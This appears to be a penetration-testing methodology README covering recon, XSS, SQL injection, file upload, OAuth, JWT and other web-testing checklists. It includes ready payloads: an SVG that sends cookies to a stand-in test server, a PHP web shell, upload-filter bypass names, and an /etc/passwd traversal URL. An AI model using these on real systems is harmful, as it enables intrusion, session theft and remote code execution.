# Methodology Aboud

Welcome to **Methodology Aboud**, a comprehensive guide for conducting security assessments and penetration testing. This repository provides detailed methodologies, tools, and techniques for identifying and exploiting various vulnerabilities in web applications and infrastructure. **Please use this information responsibly and ensure you have proper authorization before performing any security testing. Unauthorized access or testing is illegal and unethical.**

---

## Table of Contents

1. [Subdomain Enumeration](#subdomain-enumeration)
2. [Subdomain Takeover](#subdomain-takeover)
3. [Port Scanning](#port-scanning)
4. [HTTPX](#httpx)
5. [HTTP Request Smuggling](#http-request-smuggling)
6. [Directory Brute Forcing](#directory-brute-forcing)
7. [URL Gathering](#url-gathering)
8. [SQL Injection in PHP](#sql-injection-in-php)
9. [Firefox Extensions](#firefox-extensions)
10. [Opening URLs](#opening-urls)
11. [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
12. [Bypassing XSS Protections](#bypassing-xss-protections)
13. [XSS via SVG](#xss-via-svg)
14. [Login Vulnerabilities](#login-vulnerabilities)
15. [Password Reset Vulnerabilities](#password-reset-vulnerabilities)
16. [Bypassing Rate Limits](#bypassing-rate-limits)
17. [Session Vulnerabilities](#session-vulnerabilities)
18. [Signup Vulnerabilities](#signup-vulnerabilities)
19. [Hacking WordPress](#hacking-wordpress)
20. [Cloud Hacking](#cloud-hacking)
21. [Swagger-UI](#swagger-ui)
22. [Cross-Site Request Forgery (CSRF)](#cross-site-request-forgery-csrf)
23. [Privilege Escalation](#privilege-escalation)
24. [SQL Injection](#sql-injection)
25. [Bypassing 403 Forbidden](#bypassing-403-forbidden)
26. [Sensitive Data Exposure via Directory Listing](#sensitive-data-exposure-via-directory-listing-exploitation)
27. [Open Redirect](#open-redirect)
28. [File Upload in PHP](#file-upload-php)
29. [OAuth](#oauth)
30. [JWT (JSON Web Tokens)](#jwt-json-web-tokens)
31. [API & JavaScript](#api--javascript)
32. [Cache Memory](#cache-memory)
33. [Writeups](#writeups)
34. [Contact](#contact)

---

## Subdomain Enumeration

### Tools and Resources

- [SecurityTrails](https://securitytrails.com/)
- [urlscan.io](https://urlscan.io/)
- [OTX AlienVault](https://otx.alienvault.com/)
- [jldc.me](https://jldc.me/)
- [crt.sh](https://crt.sh/)
- [Assetfinder](https://github.com/tomnomnom/assetfinder)
- [Amass](https://github.com/OWASP/Amass)
- [Subdomain Finder](https://subdomainfinder.c99.nl/)
- [ShrewdEye](https://shrewdeye.app/)
- [Web Archive](https://archive.org/web/)

### Commands

```bash
# Subfinder
subfinder -dL domainfile -all --recursive -o subfile

# Assetfinder
echo "mars.com" | assetfinder --subs-only >> subfile

# Remove duplicates
cat subfile | anew >> subnew
rm subfile
```

---

## Subdomain Takeover

### Tools and Commands

```bash
subzy run --targets subnew --hide_fails --vuln | grep -v -E "Akamai|xyz|available|-"
```

*If vulnerabilities are found, research specific takeover techniques for each subdomain.*

---

## Port Scanning

### Nmap Usage

```bash
# Basic Port Scan
nmap -iL allsubs.txt -o nmap.txt

# Service Version Detection
nmap <ip> -sV

# List Nmap Scripts
cd /usr/share/nmap/scripts
ls

# Filter SSH Scripts
ls | grep ssh

# Use SSH Scripts
nmap 192.168.1.1 --scripts=ssh*

# Specific Script Example
nmap 192.168.1.1 --script=ssh-brute.nse

# Vulnerability and Exploit Scripts
nmap 192.168.1.1 --script=vuln
nmap 192.168.1.1 --script=exploit

# Bypass Firewall with SYN Scan
nmap -sS -Pn -n 192.168.1.1

# Fragmentation Mode to Bypass Firewall
nmap -f 192.168.1.1
```

---

## HTTPX

### Commands

```bash
# Check for working sites
cat subnew | httpx -o httpx.txt

# Filter for 200 OK responses
cat httpx.txt | httpx -mc 200 -o httpx.200
```

---

## HTTP Request Smuggling

### Tools and Commands

```bash
# Using smuggler.py
cat httpx.txt | smuggler.py | tee -a smuggler.txt
```

*Ensure to send POST requests with HTTP/1.1 and manipulate headers as needed.*

---

## Directory Brute Forcing and Fuzzing

### Dirsearch

```bash
# Fuzz all URLs from httpx.txt
dirsearch -l $(pwd)/httpx.txt -i 200 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,html,inc,jar,js,json,jsp,lock,log,rar,zip,xml -o dirsearch.txt

# Fuzz a specific site
dirsearch -u https://mars.com -i 200 -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,py,rb,php,html,inc,jar,js,json,jsp,lock,log,rar,zip,xml
```

### FFUF

```bash
# Fuzz with FFUF
ffuf -u https://mars.com/FUZZ -w wordlist.txt -mc 200

# Advanced FFUF with Bypass
ffuf -u https://mars.com/FUZZ -w wordlist.txt -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: 127.0.0.1"

# Dual Fuzzing
ffuf -u https://mars.com/FUZZ/AGAIN -w list1.txt:FUZZ -w list2.txt:AGAIN
```

---

## URL Gathering

### Tools and Commands

```bash
# Using Katana
katana -list httpx.txt -o katana.txt

# Using WaybackURLs
cat httpx.txt | waybackurls >> wayback.txt

# Using GoSpider
gospider -S httpx.txt | sed -n 's/.*\(https:\/\/[^ ]*\).*/\1/p' >> gospider.txt

# Combine and Remove Duplicates
cat katana.txt wayback.txt gospider.txt >> urls.txt
cat urls.txt | anew >> allurls.txt
rm urls.txt

# Filtering by File Extensions
grep -i "\.asp" allurls.txt > asp.txt
grep -i "\.php" allurls.txt > php.txt
grep -i "\.jsp" allurls.txt > jsp.txt
grep -i "\.jspx" allurls.txt > jspx.txt
grep -i "\.aspx" allurls.txt > aspx.txt
grep -i "\.js" allurls.txt > js.txt
grep -i "=" allurls.txt > inje.txt
```

---

## SQL Injection in PHP

### Steps

1. **Gather Parameters**

    ```bash
    arjun -i php.txt | tee -a parameters.txt
    ```

2. **Construct SQL Injection URL**

    ```
    https://example.com/file.php?id=*
    ```

3. **Use SQLMap**

    ```bash
    sqlmap -u "https://example.com/file.php?id=*" --dbs --banner --batch --random-agent
    ```

---

## Firefox Extensions

### Recommended Extensions

1. **Translate Extension**
2. **FoxyProxy**
3. **Wapalyzer**
4. **Multi URL Extension**
5. **Container Extension**

---

## Opening URLs

### Steps

1. **Check Technologies with Wapalyzer**
2. **Inspect Facebook Icons**
3. **View Source Code with `CTRL+U`**

---

## Cross-Site Scripting (XSS)

### Tools

- **XSStrike**
- **Kxss**
- **Knoxss.me** (Paid)

### Types of XSS and Testing Methods

1. **Reflected XSS**
2. **Stored XSS**
3. **DOM-Based XSS**
4. **XSS in Attributes**
5. **Bypassing Input Validation**
6. **Event-Based XSS**
7. **Injection via Hidden Fields**
8. **XSS in JSON Responses**
9. **XSS via Cookies**
10. **XSS in File Uploads**
11. **XSS in Error Messages**
12. **XSS in Redirection URLs**
13. **XSS in Third-Party Libraries**
14. **XSS in SVG Files**

*Detailed steps for each type can be found in the [XSS Section](#cross-site-scripting-xss).*

---

## Bypassing XSS Protections

### Techniques

1. **Encoded Payloads**
2. **Comment Tags for Obfuscation**
3. **Fragmentation of the Payload**
4. **Alternate Syntax**
5. **Mixed Case or Unicode Characters**
6. **Double Encoding**
7. **Null Bytes**
8. **Base64 Encoding**
9. **Event Handlers and Whitespace**
10. **Data Attributes**
11. **Invalid Characters and Tags**
12. **CSS Injection**
13. **SVG and XML Namespaces**
14. **Script Gadgets (Polyglots)**
15. **External Resources and Imports**

*Refer to the [Bypassing XSS Section](#bypassing-xss-protections) for detailed methodologies.*

---

## XSS via SVG

### Example Payloads

```xml
<svg onload="
    var req = new XMLHttpRequest();
    req.open('GET', 'https://us-based-organization-h1.myshopify.com/admin', false);
    req.setRequestHeader('Upgrade-Insecure-Requests', '1');
    req.setRequestHeader('User-Agent', 'Mozilla/5.0...');
    req.send(null);
    var headers = req.response.toLowerCase();
    console.log(headers);
" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" ...>
    <g>
        <path d="M28.1,36.6c4.6,1.9,..."/>
        <path d="M70.3,9.8C57.5,3.4,..."/>
    </g>
</svg>
```

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <script>
    document.addEventListener('DOMContentLoaded', () => {
      alert('Advanced XSS Test Executed!');
      console.log('Cookies:', document.cookie);
      fetch('https://your-test-server.com/log', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cookies: document.cookie, url: window.location.href })
      });
      document.body.innerHTML = '<h1 style="color: red;">XSS Test Successful!</h1>';
    });
  </script>
</svg>
```

---

## Login Vulnerabilities

### Checklist

1. **Rate Limiting**
2. **HTTP vs. HTTPS**
3. **SQL Injection in Username**
4. **Source Code Review for Passwords**
5. **Default Credentials**
6. **Parameter Enumeration with Arjun and SQLMap**
7. **Error Message Inspection**
8. **Encryption Verification with Wireshark**
9. **XSS Testing in Fields**
10. **Password Transmission Security**

---

## Password Reset Vulnerabilities

### Checklist

1. **Reset Link Uses HTTPS**
2. **Token Leakage in Requests/URLs**
3. **Rate Limiting for Reset Requests**
4. **Reset Link Invalid After Email Change**
5. **Reset Link Invalid After Password Change**
6. **Invalidate Live Sessions After Reset**
7. **Brute Force OTP or Reset Token**
8. **Reset Link Expiry**
9. **Replay Attack Prevention**
10. **Session Access Without Reset Link**
11. **Secure Token Storage**
12. **Token Exposure in Browser History/Logs**
13. **Race Conditions During Reset**
14. **SQL Injection on OTP or Reset Code**
15. **Command Injection/Parameter Tampering**

*Additional steps and detailed methodologies are provided in the [Password Reset Section](#password-reset-vulnerabilities).*

---

## Bypassing Rate Limits

### Techniques

1. **IP Rotation**
2. **Adding Custom Headers**
3. **Changing User-Agent or Cookies**
4. **Appending Null Bytes**
5. **Login and Logout Technique**
6. **Race Conditions**
7. **Adding Random Parameters**
8. **Changing Request Body Format**
9. **Changing Request Methods**
10. **Bypassing Captcha**
11. **Gmail `+` and `.` Trick**
12. **Changing API Version**

*Refer to the [Bypassing Rate Limits Section](#bypassing-rate-limits) for detailed steps.*

---

## Session Vulnerabilities

### Checklist

1. **Session Timeout**
2. **Session Fixation**
3. **Insecure Cookie Settings**
4. **Session Hijacking**
5. **Session Logout Weakness**
6. **Session Over HTTP**
7. **Session Replay**
8. **Concurrent Session Mismanagement**
9. **Session Persistence Across Browser Restarts**
10. **Session Not Invalidated After Password Change**
11. **Session Not Terminated After Account Deletion**
12. **Session Identifier Predictability**
13. **Weak Algorithm for Session IDs**
14. **Session Tokens Not Scoped to IP or Device**
15. **No Expiration for Remember Me Tokens**
16. **Improper Session Management on Reset Password**
17. **Lack of Concurrent Session Limit**
18. **Session Token Leakage**

*Detailed testing methodologies are available in the [Session Vulnerabilities Section](#session-vulnerabilities).*

---

## Signup Vulnerabilities

### Checklist

1. **HTTP vs. HTTPS on Signup/Login Pages**
2. **Lack of Verification Code or Confirmation**
3. **Account Takeover via Email Change**
4. **XSS Payloads in Registration Fields**
5. **Enable 2FA Without Confirmation**
6. **Verification Bypass Techniques**

*Refer to the [Signup Vulnerabilities Section](#signup-vulnerabilities) for detailed steps.*

---

## Hacking WordPress

### WPScan Commands

```bash
wpscan --url https://target.com --disable-tls-checks --api-token YOUR_API_TOKEN -e at,ap,u --enumerate ap --plugins-detection aggressive --force
```

### Common Endpoints

- `/wp-json/wp/v2/users`
- `/author-sitemap.xml`
- `/wp-content/debug.log`
- `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
- `/wp-login.php?action=register`
- `/wp-json/?rest_route=/wp/v2/users/`
- `/wp-json/?rest_route=/wp/v2/users/n`

---

## Cloud Hacking

### AWS S3 Bucket Enumeration

```bash
# Discover CNAME for S3
dig CNAME example.com

# List S3 Bucket Contents
aws s3 ls s3://xxx --no-sign-request
```

*If a bucket name `xxx` is found, list its contents to identify potential data exposure.*

---

## Swagger-UI

### Finding Swagger Endpoints

```bash
# Use Swagger Scanner
https://github.com/doosec101/swagger_scanner

# Example Config URLs
?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json
?configUrl=data:text/html;base64,ewoidXJsIjogImh0dHBzOi8vdGVhcmZ1bC1lYXJ0aC5zdXJnZS5zaC90ZXN0LnlhbWwiLAp9
```

*Scan for Swagger-UI endpoints and test for vulnerabilities.*

---

## Cross-Site Request Forgery (CSRF)

### Testing Steps

1. **Test Forms Without CSRF Tokens**
2. **Modify Referer and Origin Headers**
3. **Create a Malicious HTML Page**
4. **Modify Request Methods**
5. **CSRF Using Image Tags**
6. **Bypass SameSite Cookies**
7. **CSRF via JSON APIs**
8. **Multi-step Validation Bypass**
9. **Test Logout Functions**
10. **Bypass Captcha Exploits**
11. **CSRF Token Reuse**
12. **Blind CSRF**
13. **Bypass Content-Type Validation**
14. **Inspect Error Responses**
15. **Automate CSRF Exploits**

*Detailed methodologies are available in the [CSRF Section](#cross-site-request-forgery-csrf).*

---

## Bypassing CSRF Protections

### Techniques

1. **Bypassing CSRF Tokens**
2. **Referrer or Origin Spoofing**
3. **Missing CSRF Validation in API Endpoints**
4. **JSON Content-Type Bypass**
5. **SameSite Cookies Misconfiguration**
6. **CORS Misconfigurations**
7. **CSRF Token in GET Requests**
8. **Third-Party Scripts Exploitation**
9. **Blind CSRF with Token Reuse**
10. **Captcha-Based CSRF Protection Bypass**
11. **Insufficient CSRF Token Validation**
12. **Stateless Endpoints Exploitation**
13. **Null Bytes in CSRF Tokens**
14. **Token in Cookies Instead of Headers**
15. **GET Requests for CSRF Exploits**

*Refer to the [Bypassing CSRF Section](#bypassing-csrf-protections) for detailed steps.*

---

## Privilege Escalation

### Techniques

1. **Discover Low-Privilege Accounts and Hidden Features**
2. **Horizontal Privilege Escalation (IDOR Testing)**
3. **Vertical Privilege Escalation (Admin Access)**
4. **Inspect API Endpoints**
5. **Analyze Cookies for Privilege Escalation**
6. **Bypass Authorization in Admin Panels**
7. **Exploit Multi-Step Processes**
8. **JWT Token Manipulation**
9. **File Upload Exploits**
10. **CSRF Exploits for Privilege Escalation**
11. **Use Automation and Fuzzing Tools**

*Detailed methodologies are available in the [Privilege Escalation Section](#privilege-escalation).*

---

## SQL Injection

### Testing Steps

1. **Basic SQL Injection**
2. **Discover Error Messages (Error-Based SQL Injection)**
3. **Union-Based SQL Injection**
4. **Boolean-Based Blind SQL Injection**
5. **Time-Based Blind SQL Injection**
6. **Extract Database Metadata**
7. **Advanced Login Bypass**
8. **Bypass WAFs and Filters**
9. **Stored or Second-Order SQL Injection**
10. **Privilege Escalation via SQL Injection**
11. **Dump Full Database Contents**
12. **Leverage Advanced Database Functions**
13. **Combine SQL Injection with Other Vulnerabilities**

*Refer to the [SQL Injection Section](#sql-injection) for detailed steps.*

---

## Bypassing 403 Forbidden

### Techniques

1. **Using the "X-Original-URL" Header**
2. **Appending `%2e` After the First Slash**
3. **Using Dot (`.`), Slash (`/`), and Semicolon (`;`) in the URL**
4. **Adding `../` After the Directory Name**
5. **Using Uppercase Letters in the URL**
6. **Exploiting Web Cache Poisoning**

*Detailed steps are available in the [Bypassing 403 Forbidden Section](#bypassing-403-forbidden).*

---

## Sensitive Data Exposure via Directory Listing Exploitation

### Steps

1. **Check for Open Directory Listing**
2. **Brute Force Hidden Directories**
3. **Inspect for Configuration or Backup Files**
4. **Analyze File Extensions in Listed Directories**
5. **Identify Misconfigured Access Controls**
6. **Search for Indexable Directories via Search Engines**
7. **Test for Writable Directories**
8. **Inspect for Sensitive Data in Logs**
9. **Monitor for Exposed Sensitive Data in Backups**
10. **Combine with Path Traversal Attacks**
11. **Automate Recurring Checks**

*Refer to the [Sensitive Data Exposure Section](#sensitive-data-exposure-via-directory-listing-exploitation) for detailed steps.*

---

## Open Redirect

### Testing Scripts

```javascript
// 1. Testing Open Redirect vulnerability
fetch('https://target.com/redirect?url=https://attacker.com')
  .then(response => console.log('Redirect Test 1:', response.url));

// 2. URL Encoding Bypass
fetch('https://target.com/redirect?url=https%3A%2F%2Fattacker.com')
  .then(response => console.log('Encoded URL Bypass:', response.url));

// 3. Using @ or # in URLs
fetch('https://target.com/redirect?url=https://legitimate.com@attacker.com')
  .then(response => console.log('@ Character Bypass:', response.url));
fetch('https://target.com/redirect?url=https://legitimate.com#attacker.com')
  .then(response => console.log('# Character Bypass:', response.url));

// 4. Testing with additional parameters
fetch('https://target.com/redirect?next=https://attacker.com')
  .then(response => console.log('Additional Parameter Bypass:', response.url));

// 5. Exploiting Open Redirect for phishing
fetch('https://target.com/redirect?url=https://phishing.attacker.com')
  .then(response => console.log('Phishing Redirect:', response.url));

// 6. Testing with different protocols
fetch('https://target.com/redirect?url=ftp://attacker.com')
  .then(response => console.log('Protocol Bypass:', response.url));

// 7. Exploiting with CSRF or HTML tags
document.body.innerHTML += `<img src="https://target.com/redirect?url=https://attacker.com" onload="console.log('Image Loaded Bypass')">`;

// 8. OAuth redirect misuse
fetch('https://target.com/oauth?redirect_uri=https://attacker.com')
  .then(response => console.log('OAuth Redirect Exploit:', response.url));

// Report each step and log the responses for vulnerability assessment
console.log('Test complete. Check the responses for vulnerabilities.');
```

*Ensure to log and analyze each step's response to assess vulnerabilities.*

---

## File Upload in PHP

### Bypassing File Upload Restrictions

1. **File Extensions to Test**

    ```
    .php, .svg, .pdf, .asp, .aspx
    ```

2. **Steps to Exploit**

    ```php
    <?php
        // Code to execute system commands
        if(isset($_REQUEST['cmd'])){
            echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
        }
    ?>
    ```

3. **Accessing the Uploaded Shell**

    ```
    http://example.com/uploads/shell.php?cmd=ls
    ```

4. **Bypass Techniques**

    ```
    file.php%20
    file.php%0a
    file.php%00
    file.php%0d%0a
    file.php/
    file.php.\
    file.
    file.php....
    file.pHp5....
    file.png.php
    file.png.pHp5
    file.php#.png
    file.php%00.png
    file.php\x00.png
    file.php%0a.png
    file.php%0d%0a.png
    file.phpJunk123png
    ```

*These techniques aim to bypass file extension restrictions and execute malicious scripts.*

---

## OAuth

### Testing Open Redirects in OAuth

```plaintext
1. http://academy.htb.attacker.com/callback
2. http://academy.htb@attacker.com/callback 
3. http://attacker.com/callback?a=http://academy.htb
4. http://attacker.com/callback#http://academy.htb
5. http://attacker.com\@academy.htb
6. attacker.com%0d%0aacademy.htb
```

*Find open redirects and attempt exploitation using the above URLs.*

---

## JWT (JSON Web Tokens)

### Testing JWT Vulnerabilities

1. **Understanding JWT Structure**

    ```
    header.payload.signature
    ```

2. **Algorithms**

    - **HS256, HS384, HS512**: Use one key with HMAC
    - **RS256, RS384, RS512**: Use a pair of public/private keys

3. **Common Attacks**

    - **None Algorithm**
    - **Just Edit the Payload**
    - **Remove the Signature**
    - **Brute Force with Hashcat**

    ```bash
    hashcat -m 16500 jwt.txt wordlist
    ```

*Analyze and manipulate JWTs using [jwt.io](https://jwt.io/) and relevant tools.*

---

## API & JavaScript

### API Testing

- **Endpoints**

    ```
    /api/docs
    /api/swagger-ui
    ```

- **Tools**

    - **Postman**
    - **Fuzzing Tools**

### JavaScript Source Code Analysis

1. **Use Mantra to Extract Secrets**

    ```bash
    cat js.txt | mantra | tee -a mantra.txt
    ```

2. **Use Nuclei for Secret Detection**

    ```bash
    nuclei -l js.txt -t nuclei-templates/http/exposures/ -o nucleijs.txt
    ```

3. **Validate API Keys**

    ```bash
    ./google.sh AIz.............
    ```

4. **Unpack Minified JavaScript**

    - [Prettier Playground](https://prettier.io/playground/)
    - [Unpacker](https://matthewfl.com/unPacker.html)

---

## Cache Memory

### Concepts

- **Miss**: Content not found in cache.
- **Hit**: Content found in cache.

*Monitor and analyze cache behavior to optimize performance and security.*

---

## Writeups

### Repository for Writeups

- [Freedium](https://freedium.cfd/)  
  *Contribute and access writeups from platforms like Medium.*

---

## Logic Vulnerabilities

### Facebook Logic Exploit

1. **Create Album as Admin**
2. **Invite User to Album**
3. **Block User on Facebook**
4. **Impact**: Admin cannot see the user in the album, but the user can view admin's content, preventing admin from removing the user.

### Payment Provider Smart2Pay

1. **Change Email**: Update to `brixamount100abc@domain.com`.
2. **Add Funds**: Intercept and modify the amount to manipulate funds.
3. **Impact**: Attacker adds funds without paying the full amount.

### Image Upload Exploit

1. **Create Malicious Link** using IP Logger.
2. **Upload Image** with the malicious link.
3. **Impact**: Victims clicking the image reveal their IP and location.

### HTML Hide Exploit

1. **Modify HTML** to enable hidden buttons or permissions.
2. **Impact**: Unauthorized permission changes compromising platform security.

### Account Takeover in Snapchat

1. **Modify Logout Request** to include victim’s `user_id`.
2. **Use OTP Token** to access victim’s account.
3. **Impact**: Attacker accesses victim’s account without password.

### Bypass CAPTCHA

1. **Intercept CAPTCHA Request**.
2. **Modify HTTP Method** and bypass verification.
3. **Impact**: Automated requests bypass CAPTCHA protection.

---

## Contact

- **LinkedIn**: [hytham](https://www.linkedin.com/in/hytham)
- **WhatsApp**: +21023581657

---

**Disclaimer**: This repository is intended for educational purposes and authorized security testing only. Unauthorized access or testing of systems is illegal and unethical. Always obtain proper consent before performing any security assessments.
